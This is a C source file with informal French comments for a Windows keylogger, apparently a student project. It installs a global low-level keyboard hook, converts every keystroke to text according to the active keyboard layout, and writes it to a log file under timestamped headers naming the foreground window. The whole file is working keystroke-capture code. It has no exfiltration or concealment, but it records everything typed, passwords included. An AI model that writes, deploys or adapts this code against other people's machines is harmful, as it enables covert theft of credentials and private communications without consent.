#include "winkey.h"

// un jour je ferais le .h insha'Allah -> c'est fait

WCHAR lastTitle[256] = L"";

static void	wide_to_utf8(const WCHAR *src, char *dst, int dstsize)
{
	/*
		convertit un WCHAR* (ce que crache l'api windows) en UTF-8
		pour l'écrire pepouz dans le .log en %s
	*/
	WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dstsize, NULL, NULL);
}

void	AffProcessName(DWORD processID, const char *path)
{
	/*
		écrit la ligne d'entête d'un bloc :
		[jj.mm.aaaa hh:mm:ss] - <titre de la fenetre active>
		exactement comme dans l'exemple du sujet
		#OnFarmLeGit
	*/
	(void)processID;

	FILE *file = fopen(path, "a");
	if (!file)
		return ;

	time_t	now = time(NULL);
	struct tm t;
	localtime_s(&t, &now);
	char	buf[32];
	strftime(buf, sizeof(buf), "[%d.%m.%Y %H:%M:%S]", &t);

	HWND	hwnd = GetForegroundWindow();
	WCHAR	title[256] = L"";
	GetWindowTextW(hwnd, title, 256);

	char	utf8title[512] = "";
	wide_to_utf8(title, utf8title, sizeof(utf8title));

	fprintf(file, "\n%s - %s\n", buf, utf8title);
	fclose(file);
}

int    forground_process(void)
{
	/*
		function qui permet de récup et d'afficher le forground process
		(le nom de la fenetre dans laquelle on se trouve btw)
	*/
	HWND    hwnd;
	DWORD   pid;

	hwnd = GetForegroundWindow();
	GetWindowThreadProcessId(hwnd, &pid);
	AffProcessName(pid, WINKEY);
	return 0;
}

int write_key(const char *path, KBDLLHOOKSTRUCT *kb)
{
	/*
		t'sais le mec qui croit qu'on est en python + rp claude
		write_key écrit la touche en version lisible dans le .log.
		-> les touches spéciales = un p'tit mot (Shift, Ctrl...) comme l'exemple
		-> les vraies touches = traduites selon le layout clavier (locale)
		   avec ToUnicodeEx, donc AZERTY/QWERTY/whatever ça suit
	*/
	FILE *file = fopen(path, "a");
	if (!file)
		return 1;

	DWORD			vk = kb->vkCode;
	const char		*name = NULL;

	switch (vk)
	{
		case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT:    		name = "Shift"; break;
		case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL:	name = "Ctrl"; break;
		case VK_LMENU: case VK_RMENU: case VK_MENU:       		name = "Alt"; break;
		case VK_LWIN: case VK_RWIN:                       		name = "Win"; break;
		case VK_TAB:                                      		name = "Tab"; break;
		case VK_BACK:                                     		name = "Back"; break;
		case VK_CAPITAL:                                  		name = "CapsLock"; break;
		case VK_ESCAPE:                                   		name = "Esc"; break;
		case VK_DELETE:                                   		name = "Del"; break;
		case VK_LEFT:                                     		name = "Left"; break;
		case VK_RIGHT:                                    		name = "Right"; break;
		case VK_UP:                                       		name = "Up"; break;
		case VK_DOWN:                                     		name = "Down"; break;
		case VK_RETURN:
			fprintf(file, "\n");
			fclose(file);
			return 0;
	}
	if (name)
	{
		fprintf(file, "%s", name);
		fclose(file);
		return 0;
	}

	// état des modifieurs (fiable dans un hook LL via GetAsyncKeyState)
	int		ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
	int		alt   = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
	int		altgr = (ctrl && alt);

	// Ctrl+touche (type CtrlS) -> on balance juste la lettre/chiffre brut
	if (ctrl && !altgr)
	{
		if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9'))
			fprintf(file, "%c", (char)vk);
		fclose(file);
		return 0;
	}

	// traduction selon la locale (layout de la fenetre au premier plan)
	HWND	hwnd = GetForegroundWindow();
	DWORD	tid = GetWindowThreadProcessId(hwnd, NULL);
	HKL		layout = GetKeyboardLayout(tid);

	BYTE	state[256] = {0};
	if (GetAsyncKeyState(VK_SHIFT) & 0x8000)   state[VK_SHIFT] = 0x80;
	if (GetKeyState(VK_CAPITAL) & 0x0001)      state[VK_CAPITAL] = 0x01;
	if (altgr)
	{
		state[VK_CONTROL] = 0x80;
		state[VK_MENU] = 0x80;
	}

	WCHAR	out[8] = L"";
	int		n = ToUnicodeEx(vk, kb->scanCode, state, out, 8, 0, layout);

	for (int i = 0; i < n; i++)
	{
		char	c[8] = "";
		WCHAR	one[2] = { out[i], L'\0' };
		wide_to_utf8(one, c, sizeof(c));
		fprintf(file, "%s", c);
	}

	fclose(file);
	return 0;
}

LRESULT CALLBACK foo(int ncode, WPARAM wparam, LPARAM lparam)
{
	/*
		ca utilise tout ce qu'il y a avant pour en faire un seul bloc
		la function de goat finallement.
		-> on log au KEYDOWN (comme l'exemple : "ShiftHey", Shift puis la frappe)
		-> changement de fenetre (titre) = nouveau bloc avec entête
	*/
	KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lparam;

	if (ncode == HC_ACTION && (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN))
	{
		HWND	hwnd = GetForegroundWindow();
		WCHAR	title[256] = L"";
		GetWindowTextW(hwnd, title, 256);

		if (wcscmp(title, lastTitle) != 0)
		{
			DWORD	pid = 0;
			GetWindowThreadProcessId(hwnd, &pid);
			AffProcessName(pid, WINKEY);
			wcscpy_s(lastTitle, 256, title);
		}
		write_key(WINKEY, kb);
	}
	return (CallNextHookEx(NULL, ncode, wparam, lparam));
}

int	create_file(const char *path)
{
	/*
		crée le fichier winkey.log situ
	*/
	FILE *f = fopen(path, "a");
	if (f == NULL)
	{
		perror("Can't create file");
		return 1;
	}
	fclose(f);
	return 0;
}

int main(void)
{
	/*
		la main function quoi classique
	*/
	HHOOK hook = SetWindowsHookEx(
		WH_KEYBOARD_LL, // Type de hook
		foo,            // Fonction a appeler
		NULL,           // Ou trouver la fonction (null car osef)
		0);             // Thread ID
	MSG msg;

	if (hook == NULL)
	{
		printf("Failed to install hook: %ld\n", GetLastError());
		return 1;
	}

	printf("Hook ok: %p\n", (void*)hook);
	create_file(WINKEY);
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hook);
	return 0;
}
